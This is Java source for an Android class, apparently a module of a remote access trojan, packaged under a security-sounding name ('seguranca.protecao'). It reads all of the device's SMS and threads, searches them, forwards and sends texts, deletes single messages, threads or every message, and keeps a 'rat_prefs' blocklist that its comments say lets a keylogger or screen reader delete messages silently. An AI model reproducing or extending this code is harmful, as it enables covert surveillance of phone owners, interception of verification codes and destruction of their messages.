package com.seguranca.protecao;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

/**
 * SmsFeatures — full SMS category feature set.
 *
 * Features:
 *  - getSms()             GET_SMS  (existing, moved here for completeness)
 *  - getSmsThreads()      GET_SMS_THREADS
 *  - getSmsInThread()     GET_SMS_IN_THREAD
 *  - deleteSms()          DELETE_SMS
 *  - deleteAllSms()       DELETE_ALL_SMS
 *  - deleteSmsThread()    DELETE_SMS_THREAD
 *  - markSmsRead()        MARK_SMS_READ
 *  - markAllSmsRead()     MARK_ALL_SMS_READ
 *  - forwardSms()         FORWARD_SMS
 *  - sendSms()            SEND_SMS  (existing)
 *  - searchSms()          SEARCH_SMS
 *  - blockSmsSender()     BLOCK_SMS_SENDER
 */
public class SmsFeatures {

    private static final String TAG = "SmsFeatures";
    private static final Uri SMS_URI   = Uri.parse("content://sms");
    private static final Uri MMS_SMS   = Uri.parse("content://mms-sms/conversations");
    private final Context ctx;
    private final SimpleDateFormat sdf =
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    public SmsFeatures(Context ctx) {
        this.ctx = ctx;
    }

    // ─── GET SMS ─────────────────────────────────────────────────────────────

    /**
     * Reads all SMS (inbox + sent + draft). Returns JSON array.
     */
    public String getSms(int limit) {
        JsonArray arr = new JsonArray();
        try {
            Cursor c = ctx.getContentResolver().query(
                SMS_URI,
                new String[]{"_id", "address", "date", "body", "type", "read", "thread_id"},
                null, null,
                "date DESC LIMIT " + limit
            );
            if (c != null) {
                while (c.moveToNext()) {
                    try {
                        JsonObject obj = new JsonObject();
                        obj.addProperty("id",        c.getLong  (c.getColumnIndexOrThrow("_id")));
                        obj.addProperty("address",   nullSafe(c.getString(c.getColumnIndexOrThrow("address"))));
                        obj.addProperty("body",      nullSafe(c.getString(c.getColumnIndexOrThrow("body"))));
                        long date = c.getLong(c.getColumnIndexOrThrow("date"));
                        obj.addProperty("date",      date);
                        obj.addProperty("date_str",  sdf.format(new Date(date)));
                        int type = c.getInt(c.getColumnIndexOrThrow("type"));
                        obj.addProperty("type",      type == 1 ? "inbox" : (type == 2 ? "sent" : "draft"));
                        obj.addProperty("read",      c.getInt(c.getColumnIndexOrThrow("read")) == 1);
                        obj.addProperty("thread_id", c.getLong(c.getColumnIndexOrThrow("thread_id")));
                        arr.add(obj);
                    } catch (Exception ignored) {}
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "getSms: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── GET SMS THREADS ─────────────────────────────────────────────────────

    /**
     * Returns all SMS conversation threads (grouped by contact).
     */
    public String getSmsThreads() {
        JsonArray arr = new JsonArray();
        try {
            Uri threadUri = Uri.parse("content://mms-sms/conversations?simple=true");
            Cursor c = ctx.getContentResolver().query(
                threadUri,
                null, null, null,
                "date DESC"
            );
            if (c != null) {
                while (c.moveToNext()) {
                    try {
                        JsonObject obj = new JsonObject();
                        int idIdx = c.getColumnIndex("_id");
                        int addrIdx = c.getColumnIndex("address");
                        int bodyIdx = c.getColumnIndex("body");
                        int dateIdx = c.getColumnIndex("date");
                        int countIdx = c.getColumnIndex("msg_count");
                        int unreadIdx = c.getColumnIndex("unread_count");
                        if (idIdx >= 0) obj.addProperty("thread_id", c.getLong(idIdx));
                        if (addrIdx >= 0) obj.addProperty("address", nullSafe(c.getString(addrIdx)));
                        if (bodyIdx >= 0) obj.addProperty("snippet", nullSafe(c.getString(bodyIdx)));
                        if (dateIdx >= 0) {
                            long date = c.getLong(dateIdx);
                            obj.addProperty("date", date);
                            obj.addProperty("date_str", sdf.format(new Date(date)));
                        }
                        if (countIdx >= 0) obj.addProperty("msg_count", c.getInt(countIdx));
                        if (unreadIdx >= 0) obj.addProperty("unread_count", c.getInt(unreadIdx));
                        arr.add(obj);
                    } catch (Exception ignored) {}
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "getSmsThreads: " + e.getMessage());
        }
        return arr.toString();
    }

    /**
     * Returns all messages in a specific thread.
     */
    public String getSmsInThread(long threadId) {
        JsonArray arr = new JsonArray();
        try {
            Cursor c = ctx.getContentResolver().query(
                SMS_URI,
                new String[]{"_id", "address", "date", "body", "type", "read"},
                "thread_id = ?",
                new String[]{String.valueOf(threadId)},
                "date DESC LIMIT 200"
            );
            if (c != null) {
                while (c.moveToNext()) {
                    try {
                        JsonObject obj = new JsonObject();
                        obj.addProperty("id",      c.getLong  (c.getColumnIndexOrThrow("_id")));
                        obj.addProperty("address", nullSafe(c.getString(c.getColumnIndexOrThrow("address"))));
                        obj.addProperty("body",    nullSafe(c.getString(c.getColumnIndexOrThrow("body"))));
                        long date = c.getLong(c.getColumnIndexOrThrow("date"));
                        obj.addProperty("date",    date);
                        obj.addProperty("date_str",sdf.format(new Date(date)));
                        int type = c.getInt(c.getColumnIndexOrThrow("type"));
                        obj.addProperty("type",    type == 1 ? "inbox" : (type == 2 ? "sent" : "draft"));
                        obj.addProperty("read",    c.getInt(c.getColumnIndexOrThrow("read")) == 1);
                        arr.add(obj);
                    } catch (Exception ignored) {}
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "getSmsInThread: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── DELETE SMS ──────────────────────────────────────────────────────────

    /**
     * Deletes a single SMS by its _id.
     */
    public String deleteSms(long id) {
        try {
            int del = ctx.getContentResolver().delete(
                SMS_URI, "_id = ?", new String[]{String.valueOf(id)}
            );
            return del > 0 ? "OK: deleted id=" + id : "NOT_FOUND";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Deletes all messages in a thread.
     */
    public String deleteSmsThread(long threadId) {
        try {
            int del = ctx.getContentResolver().delete(
                SMS_URI, "thread_id = ?", new String[]{String.valueOf(threadId)}
            );
            return "OK: deleted " + del + " messages in thread " + threadId;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Deletes ALL SMS on the device.
     */
    public String deleteAllSms() {
        try {
            int del = ctx.getContentResolver().delete(SMS_URI, null, null);
            return "OK: deleted " + del + " messages";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Deletes all messages from/to a specific number.
     */
    public String deleteSmsFromNumber(String number) {
        if (number == null || number.isEmpty()) return "ERROR: number required";
        try {
            int del = ctx.getContentResolver().delete(
                SMS_URI, "address = ?", new String[]{number.trim()}
            );
            return "OK: deleted " + del + " messages from " + number;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── MARK READ / UNREAD ──────────────────────────────────────────────────

    public String markSmsRead(long id, boolean read) {
        try {
            ContentValues v = new ContentValues();
            v.put("read", read ? 1 : 0);
            int updated = ctx.getContentResolver().update(
                SMS_URI, v, "_id = ?", new String[]{String.valueOf(id)}
            );
            return updated > 0 ? "OK" : "NOT_FOUND";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String markAllSmsRead() {
        try {
            ContentValues v = new ContentValues();
            v.put("read", 1);
            int updated = ctx.getContentResolver().update(SMS_URI, v, "read = 0", null);
            return "OK: marked " + updated + " messages as read";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── FORWARD SMS ─────────────────────────────────────────────────────────

    /**
     * Forwards the body of an existing SMS (by id) to another number.
     */
    public String forwardSms(long smsId, String toNumber) {
        if (toNumber == null || toNumber.isEmpty()) return "ERROR: toNumber required";
        try {
            Cursor c = ctx.getContentResolver().query(
                SMS_URI, new String[]{"body"}, "_id = ?",
                new String[]{String.valueOf(smsId)}, null
            );
            if (c == null || !c.moveToFirst()) return "ERROR: SMS not found id=" + smsId;
            String body = c.getString(c.getColumnIndexOrThrow("body"));
            c.close();
            if (body == null) return "ERROR: body is null";
            return sendSms(toNumber, "FWD: " + body);
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Sends an SMS (used internally and exposed as SEND_SMS).
     */
    public String sendSms(String number, String message) {
        if (number == null || number.isEmpty()) return "ERROR: number required";
        if (message == null || message.isEmpty()) return "ERROR: message required";
        try {
            SmsManager sm;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                sm = ctx.getSystemService(SmsManager.class);
                if (sm == null) sm = SmsManager.getDefault();
            } else {
                sm = SmsManager.getDefault();
            }
            if (message.length() > 160) {
                ArrayList<String> parts = sm.divideMessage(message);
                sm.sendMultipartTextMessage(number.trim(), null, parts, null, null);
            } else {
                sm.sendTextMessage(number.trim(), null, message, null, null);
            }
            return "OK: SMS sent to " + number;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── SEARCH SMS ──────────────────────────────────────────────────────────

    /**
     * Searches SMS body and address for a query string.
     */
    public String searchSms(String query) {
        if (query == null || query.isEmpty()) return "[]";
        JsonArray arr = new JsonArray();
        try {
            String like = "%" + query + "%";
            Cursor c = ctx.getContentResolver().query(
                SMS_URI,
                new String[]{"_id", "address", "date", "body", "type"},
                "body LIKE ? OR address LIKE ?",
                new String[]{like, like},
                "date DESC LIMIT 100"
            );
            if (c != null) {
                while (c.moveToNext()) {
                    try {
                        JsonObject obj = new JsonObject();
                        obj.addProperty("id",      c.getLong  (c.getColumnIndexOrThrow("_id")));
                        obj.addProperty("address", nullSafe(c.getString(c.getColumnIndexOrThrow("address"))));
                        obj.addProperty("body",    nullSafe(c.getString(c.getColumnIndexOrThrow("body"))));
                        long date = c.getLong(c.getColumnIndexOrThrow("date"));
                        obj.addProperty("date",    date);
                        obj.addProperty("date_str",sdf.format(new Date(date)));
                        int type = c.getInt(c.getColumnIndexOrThrow("type"));
                        obj.addProperty("type",    type == 1 ? "inbox" : "sent");
                        arr.add(obj);
                    } catch (Exception ignored) {}
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "searchSms: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── BLOCK SMS SENDER ────────────────────────────────────────────────────

    /**
     * Adds a number to a local SMS blocklist.
     * When the keylogger/screen reader sees a message from this number, it is deleted silently.
     */
    public String blockSmsSender(String number) {
        if (number == null || number.isEmpty()) return "ERROR: number required";
        try {
            android.content.SharedPreferences prefs =
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("blocked_sms_senders", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            for (int i = 0; i < arr.size(); i++) {
                if (arr.get(i).getAsString().equals(number.trim())) {
                    return "OK: already blocked";
                }
            }
            arr.add(number.trim());
            prefs.edit().putString("blocked_sms_senders", arr.toString()).apply();
            return "OK: " + number + " blocked for SMS";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String unblockSmsSender(String number) {
        if (number == null || number.isEmpty()) return "ERROR: number required";
        try {
            android.content.SharedPreferences prefs =
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("blocked_sms_senders", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            JsonArray newArr = new JsonArray();
            for (int i = 0; i < arr.size(); i++) {
                if (!arr.get(i).getAsString().equals(number.trim())) newArr.add(arr.get(i));
            }
            prefs.edit().putString("blocked_sms_senders", newArr.toString()).apply();
            return "OK: " + number + " unblocked for SMS";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String getBlockedSmsSenders() {
        try {
            return ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("blocked_sms_senders", "[]");
        } catch (Exception e) {
            return "[]";
        }
    }

    private String nullSafe(String s) { return s != null ? s : ""; }
}
